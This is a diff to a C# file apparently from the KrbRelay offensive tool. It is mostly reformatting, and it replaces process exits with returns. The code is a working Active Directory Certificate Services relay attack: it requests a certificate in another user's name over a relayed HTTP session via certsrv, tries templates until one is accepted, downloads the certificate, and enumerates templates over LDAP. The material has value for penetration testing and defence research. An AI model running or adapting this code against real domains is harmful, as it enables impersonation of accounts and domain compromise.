@@ -23,7 +23,12 @@ namespace KrbRelay.Clients.Attacks.Http
     {
         // https://github.com/bats3c/ADCSPwn
 
-        public static void requestCertificate(HttpClient httpClient, string user, string domain, string template = null)
+        public static void requestCertificate(
+            HttpClient httpClient,
+            string user,
+            string domain,
+            string template = null
+        )
         {
             HttpResponseMessage result;
 
@@ -37,15 +42,19 @@ namespace KrbRelay.Clients.Attacks.Http
             // set the attributes of the cert
             var cert_attribs = new Dictionary<DerObjectIdentifier, string>
             {
-                {
-                    X509Name.CN, string.Format("{0}\\{1}", domain, user)
-                }
+                { X509Name.CN, string.Format("{0}\\{1}", domain, user) }
             };
 
             var subject = new X509Name(cert_attribs.Keys.ToList(), cert_attribs);
 
             // generate the CSR
-            var pkcs10CertificationRequest = new Pkcs10CertificationRequest(PkcsObjectIdentifiers.Sha256WithRsaEncryption.Id, subject, keyPair.Public, null, keyPair.Private);
+            var pkcs10CertificationRequest = new Pkcs10CertificationRequest(
+                PkcsObjectIdentifiers.Sha256WithRsaEncryption.Id,
+                subject,
+                keyPair.Public,
+                null,
+                keyPair.Private
+            );
             var csr = Convert.ToBase64String(pkcs10CertificationRequest.GetEncoded());
 
             // correctly format the certificate
@@ -83,10 +92,22 @@ namespace KrbRelay.Clients.Attacks.Http
                     data += CertificateTemplates[i];
                     data += "&TargetStoreFlags=0&SaveCert=yes&ThumbPrint=";
 
-                    using (var message = new HttpRequestMessage(HttpMethod.Post, "certsrv/certfnsh.asp"))
+                    using (
+                        var message = new HttpRequestMessage(
+                            HttpMethod.Post,
+                            "certsrv/certfnsh.asp"
+                        )
+                    )
                     {
-                        message.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko");
-                        message.Content = new StringContent(data, Encoding.UTF8, "application/x-www-form-urlencoded");
+                        message.Headers.Add(
+                            "User-Agent",
+                            "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
+                        );
+                        message.Content = new StringContent(
+                            data,
+                            Encoding.UTF8,
+                            "application/x-www-form-urlencoded"
+                        );
                         message.Method = HttpMethod.Post;
                         result = httpClient.SendAsync(message).Result;
                     }
@@ -111,7 +132,9 @@ namespace KrbRelay.Clients.Attacks.Http
                         else
                         {
                             found_template = true;
-                            Console.WriteLine("[+] Found valid template: " + CertificateTemplates[i]);
+                            Console.WriteLine(
+                                "[+] Found valid template: " + CertificateTemplates[i]
+                            );
                             break;
                         }
                     }
@@ -121,7 +144,7 @@ namespace KrbRelay.Clients.Attacks.Http
             if (!found_template)
             {
                 Console.WriteLine("[-] Unable to find any usable templates");
-                Environment.Exit(1);
+                return;
             }
 
             // find the req id of the certificate
@@ -129,17 +152,27 @@ namespace KrbRelay.Clients.Attacks.Http
             reqid = match.Groups[1].ToString();
             if (reqid.Length == 0)
             {
-                Console.WriteLine("[-] Failed to find the certificate request id... dumping all page content.");
+                Console.WriteLine(
+                    "[-] Failed to find the certificate request id... dumping all page content."
+                );
                 Console.WriteLine(responseFromServer);
-                Environment.Exit(1);
+                return;
             }
             //reqid = "62";
 
             Console.WriteLine("[*] SUCCESS (ReqID: " + reqid + ")");
             Console.WriteLine("[*] Downloading certificate");
-            using (var message = new HttpRequestMessage(HttpMethod.Get, String.Format("certsrv/certnew.cer?ReqID={0}", reqid)))
+            using (
+                var message = new HttpRequestMessage(
+                    HttpMethod.Get,
+                    String.Format("certsrv/certnew.cer?ReqID={0}", reqid)
+                )
+            )
             {
-                message.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko");
+                message.Headers.Add(
+                    "User-Agent",
+                    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
+                );
                 result = httpClient.SendAsync(message).Result;
             }
 
@@ -203,11 +236,12 @@ namespace KrbRelay.Clients.Attacks.Http
 
         public static string[] templateHunter()
         {
-            String Base = "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,";
+            String Base =
+                "LDAP://CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,";
             DirectoryEntry DirEntry = null;
             DirectorySearcher DirSearch = null;
 
-            String LdapBase = Base + Program.domainDN;
+            String LdapBase = Base + State.domainDN;
             DirEntry = new DirectoryEntry(LdapBase);
             DirSearch = new DirectorySearcher(DirEntry);
 
@@ -221,8 +255,7 @@ namespace KrbRelay.Clients.Attacks.Http
                 {
                     Templates.Add(Result.Properties["name"][0].ToString());
                 }
-                catch (Exception ex)
-                { }
+                catch (Exception ex) { }
             }
 
             return Templates.ToArray();
@@ -236,8 +269,7 @@ namespace KrbRelay.Clients.Attacks.Http
         {
             private char[] password;
 
-            public PasswordStore(
-                        char[] password)
+            public PasswordStore(char[] password)
             {
                 this.password = password;
             }
